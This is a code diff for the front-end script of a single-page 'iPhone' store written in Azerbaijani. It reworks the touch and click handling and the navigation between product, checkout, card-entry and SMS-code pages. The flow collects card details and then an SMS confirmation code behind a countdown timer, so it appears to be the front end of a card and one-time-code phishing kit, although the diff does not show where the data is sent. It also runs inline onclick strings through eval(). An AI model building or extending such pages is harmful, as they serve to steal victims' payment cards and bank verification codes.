@@ -46,50 +46,32 @@ function isMac() {
   return navigator.platform.toUpperCase().indexOf("MAC") >= 0
 }
 
-// Enhanced Universal Click Handler
-function createClickHandler(element, callback) {
-  if (!element || !callback) return
+// Enhanced touch support for all devices
+function addUniversalClickSupport(element, callback) {
+  if (!element) return
 
-  let isHandling = false
+  // Remove any existing event listeners
+  element.removeEventListener("click", callback)
+  element.removeEventListener("touchstart", callback)
+  element.removeEventListener("touchend", callback)
 
-  const handleClick = (e) => {
-    if (isHandling) return
-    isHandling = true
-
+  // Add click event (works on all devices)
+  element.addEventListener("click", (e) => {
     e.preventDefault()
     e.stopPropagation()
+    console.log("Click event triggered on:", element)
+    callback(e)
+  })
 
-    console.log("🎯 Click handled for:", element.tagName, element.className)
-
-    try {
-      callback(e)
-    } catch (error) {
-      console.error("❌ Error in click handler:", error)
-    }
-
-    setTimeout(() => {
-      isHandling = false
-    }, 100)
-  }
-
-  // Remove existing listeners
-  element.removeEventListener("click", handleClick)
-  element.removeEventListener("touchend", handleClick)
-
-  // Add click listener (works on all devices)
-  element.addEventListener("click", handleClick, { passive: false })
-
-  // Add touch support for mobile
+  // Add touch events for mobile devices
   if (isMobile() || isIOS()) {
     let touchStartTime = 0
-    let touchStartY = 0
 
     element.addEventListener(
       "touchstart",
       (e) => {
         touchStartTime = Date.now()
-        touchStartY = e.touches[0].clientY
-        element.style.opacity = "0.8"
+        element.style.opacity = "0.7"
       },
       { passive: true },
     )
@@ -98,14 +80,14 @@ function createClickHandler(element, callback) {
       "touchend",
       (e) => {
         const touchDuration = Date.now() - touchStartTime
-        const touchEndY = e.changedTouches[0].clientY
-        const touchDistance = Math.abs(touchEndY - touchStartY)
-
         element.style.opacity = "1"
 
-        // Only trigger if it's a quick tap and not a scroll
-        if (touchDuration < 500 && touchDistance < 10) {
-          handleClick(e)
+        // Only trigger if it's a quick tap (not a scroll)
+        if (touchDuration < 500) {
+          e.preventDefault()
+          e.stopPropagation()
+          console.log("Touch event triggered on:", element)
+          callback(e)
         }
       },
       { passive: false },
@@ -116,7 +98,7 @@ function createClickHandler(element, callback) {
     })
   }
 
-  // Enhanced styling
+  // Enhanced styling for better touch interaction
   element.style.cursor = "pointer"
   element.style.webkitTapHighlightColor = "transparent"
   element.style.webkitUserSelect = "none"
@@ -124,28 +106,27 @@ function createClickHandler(element, callback) {
   element.style.webkitTouchCallout = "none"
 }
 
-// Global Navigation Functions
+// Global function declarations with enhanced debugging
 function goToCheckout() {
-  console.log("🔥 goToCheckout called")
+  console.log("🔥 goToCheckout called - navigating to checkout")
   showPage("checkoutPage")
 }
 
 function goToProduct() {
-  console.log("🔥 goToProduct called")
+  console.log("🔥 goToProduct called - navigating to product")
   showPage("productPage")
 }
 
 function goToPayment() {
-  console.log("🔥 goToPayment called")
+  console.log("🔥 goToPayment called - navigating to payment")
   showPage("cardPage")
 }
 
 function goToSms() {
-  console.log("🔥 goToSms called")
+  console.log("🔥 goToSms called - navigating to SMS")
   showPage("smsPage")
 }
 
-// Image Functions
 function selectImage(index) {
   console.log("🔥 selectImage called:", index)
   currentImageIndex = index
@@ -206,16 +187,13 @@ function selectColor(colorId, colorName) {
   updateThumbnails()
 }
 
-// Form Handlers
 function submitCardForm(event) {
   console.log("🔥 submitCardForm called")
   event.preventDefault()
 
   const submitBtn = event.target.querySelector(".btn-confirm")
-  if (submitBtn) {
-    submitBtn.textContent = "İşlənir..."
-    submitBtn.disabled = true
-  }
+  submitBtn.textContent = "İşlənir..."
+  submitBtn.disabled = true
 
   // Collect card data
   const cardData = {
@@ -290,7 +268,7 @@ window.submitCardForm = submitCardForm
 window.submitSmsCode = submitSmsCode
 window.resendSms = resendSms
 
-// Page Management
+// showPage function with enhanced debugging
 function showPage(pageId) {
   console.log("🔥 showPage called:", pageId)
 
@@ -323,21 +301,21 @@ function showPage(pageId) {
 
 window.showPage = showPage
 
-// Initialize Application
+// Initialize the application
+document.addEventListener("DOMContentLoaded", () => {
+  console.log("🚀 DOM loaded, initializing app")
+  initializeApp()
+})
+
+// iOS/Safari için ek event listener
+document.addEventListener("touchstart", () => {}, { passive: true })
+
 function initializeApp() {
   console.log("🚀 App initializing...")
-
-  // Show default page
   showPage("productPage")
-
-  // Update images
   updateMainImage()
-
-  // Setup event listeners
   setupEventListeners()
-
-  // Setup click handlers
-  setupClickHandlers()
+  setupUniversalClickSupport()
 
   // Add viewport meta tag if missing
   if (!document.querySelector('meta[name="viewport"]')) {
@@ -346,22 +324,19 @@ function initializeApp() {
     viewport.content = "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     document.head.appendChild(viewport)
   }
-
-  console.log("✅ App initialized successfully!")
 }
 
-// Setup Click Handlers
-function setupClickHandlers() {
-  console.log("🔧 Setting up click handlers...")
+function setupUniversalClickSupport() {
+  console.log("🔧 Setting up universal click support...")
 
-  // Wait for DOM elements to be available
+  // Wait for DOM to be fully loaded
   setTimeout(() => {
-    // Main buy button
-    const mainBuyBtn = document.getElementById("mainBuyButton")
-    if (mainBuyBtn) {
-      console.log("✅ Setting up main buy button")
-      createClickHandler(mainBuyBtn, () => {
-        console.log("🎯 Main buy button clicked!")
+    // Primary action button
+    const primaryBtn = document.querySelector(".btn-primary")
+    if (primaryBtn) {
+      console.log("✅ Adding click support to primary button")
+      addUniversalClickSupport(primaryBtn, () => {
+        console.log("🎯 Primary button clicked!")
         goToCheckout()
       })
     }
@@ -369,8 +344,8 @@ function setupClickHandlers() {
     // Complete order button
     const completeBtn = document.querySelector(".btn-complete-order")
     if (completeBtn) {
-      console.log("✅ Setting up complete order button")
-      createClickHandler(completeBtn, () => {
+      console.log("✅ Adding click support to complete order button")
+      addUniversalClickSupport(completeBtn, () => {
         console.log("🎯 Complete order button clicked!")
         goToPayment()
       })
@@ -379,8 +354,8 @@ function setupClickHandlers() {
     // Back buttons
     const backBtns = document.querySelectorAll(".back-btn")
     backBtns.forEach((btn, index) => {
-      console.log(`✅ Setting up back button ${index}`)
-      createClickHandler(btn, () => {
+      console.log(`✅ Adding click support to back button ${index}`)
+      addUniversalClickSupport(btn, () => {
         console.log(`🎯 Back button ${index} clicked!`)
         const onclick = btn.getAttribute("onclick")
         if (onclick) {
@@ -396,8 +371,8 @@ function setupClickHandlers() {
     // Thumbnail buttons
     const thumbnails = document.querySelectorAll(".thumbnail")
     thumbnails.forEach((thumb, index) => {
-      console.log(`✅ Setting up thumbnail ${index}`)
-      createClickHandler(thumb, () => {
+      console.log(`✅ Adding click support to thumbnail ${index}`)
+      addUniversalClickSupport(thumb, () => {
         console.log(`🎯 Thumbnail ${index} clicked!`)
         selectImage(index)
       })
@@ -406,8 +381,8 @@ function setupClickHandlers() {
     // Color buttons
     const colorBtns = document.querySelectorAll(".color-option")
     colorBtns.forEach((btn, index) => {
-      console.log(`✅ Setting up color button ${index}`)
-      createClickHandler(btn, () => {
+      console.log(`✅ Adding click support to color button ${index}`)
+      addUniversalClickSupport(btn, () => {
         console.log(`🎯 Color button ${index} clicked!`)
         const onclick = btn.getAttribute("onclick")
         if (onclick) {
@@ -423,8 +398,8 @@ function setupClickHandlers() {
     // Navigation buttons
     const navBtns = document.querySelectorAll(".nav-btn")
     navBtns.forEach((btn, index) => {
-      console.log(`✅ Setting up nav button ${index}`)
-      createClickHandler(btn, () => {
+      console.log(`✅ Adding click support to nav button ${index}`)
+      addUniversalClickSupport(btn, () => {
         console.log(`🎯 Nav button ${index} clicked!`)
         const onclick = btn.getAttribute("onclick")
         if (onclick) {
@@ -440,8 +415,8 @@ function setupClickHandlers() {
     // Form buttons
     const formBtns = document.querySelectorAll(".btn-confirm, .btn-cancel, .btn-resend")
     formBtns.forEach((btn, index) => {
-      console.log(`✅ Setting up form button ${index}`)
-      createClickHandler(btn, () => {
+      console.log(`✅ Adding click support to form button ${index}`)
+      addUniversalClickSupport(btn, () => {
         console.log(`🎯 Form button ${index} clicked!`)
         if (btn.type === "submit") {
           const form = btn.closest("form")
@@ -462,11 +437,10 @@ function setupClickHandlers() {
       })
     })
 
-    console.log("✅ Click handlers setup complete!")
-  }, 200)
+    console.log("✅ Universal click support setup complete!")
+  }, 100)
 }
 
-// Setup Event Listeners
 function setupEventListeners() {
   console.log("🔧 Setting up event listeners...")
 
@@ -490,10 +464,11 @@ function setupEventListeners() {
   if (phoneNumber) {
     phoneNumber.addEventListener("input", (e) => {
       let value = e.target.value.replace(/\D/g, "")
-      if (value.length > 7) {
-        value = value.substring(0, 7)
+      if (value.length > 8) {
+        // 7'den 8'e değiştir
+        value = value.substring(0, 8) // 7'den 8'e değiştir
       }
-      // Format as XXX XX XX
+      // Format as XXX XX XXX (son kısım 3 rakam olacak)
       if (value.length > 3) {
         if (value.length > 5) {
           value = value.substring(0, 3) + " " + value.substring(3, 5) + " " + value.substring(5)
@@ -715,15 +690,6 @@ function updateTimerDisplay() {
   }
 }
 
-// Event Listeners
-document.addEventListener("DOMContentLoaded", () => {
-  console.log("🚀 DOM loaded, initializing app")
-  initializeApp()
-})
-
-// iOS/Safari için ek event listener
-document.addEventListener("touchstart", () => {}, { passive: true })
-
 // Initialize when page loads
 window.addEventListener("load", () => {
   console.log("🎉 iPhone Product Page Loaded Successfully!")
@@ -736,10 +702,8 @@ window.addEventListener("load", () => {
     touchPoints: navigator.maxTouchPoints,
   })
 
-  // Re-setup click handlers after page load
-  setTimeout(() => {
-    setupClickHandlers()
-  }, 500)
+  // Re-setup click support after page load
+  setTimeout(setupUniversalClickSupport, 500)
 })
 
 // iOS Safari için ek düzeltmeler
@@ -754,20 +718,18 @@ if (isIOS() || isMac()) {
     clickableElements.forEach((element) => {
       element.style.cursor = "pointer"
       element.addEventListener("touchstart", () => {}, { passive: true })
+
+      // Force enable click events
+      element.onclick = function (e) {
+        const originalOnclick = this.getAttribute("onclick")
+        if (originalOnclick) {
+          try {
+            eval(originalOnclick)
+          } catch (error) {
+            console.error("Error executing onclick:", error)
+          }
+        }
+      }
     })
   })
 }
-
-// Debug function for testing
-window.testMainButton = () => {
-  console.log("🧪 Testing main button click")
-  const mainBtn = document.getElementById("mainBuyButton")
-  if (mainBtn) {
-    console.log("✅ Main button found, triggering click")
-    mainBtn.click()
-  } else {
-    console.log("❌ Main button not found")
-  }
-}
-
-console.log("🎯 Script loaded successfully!")
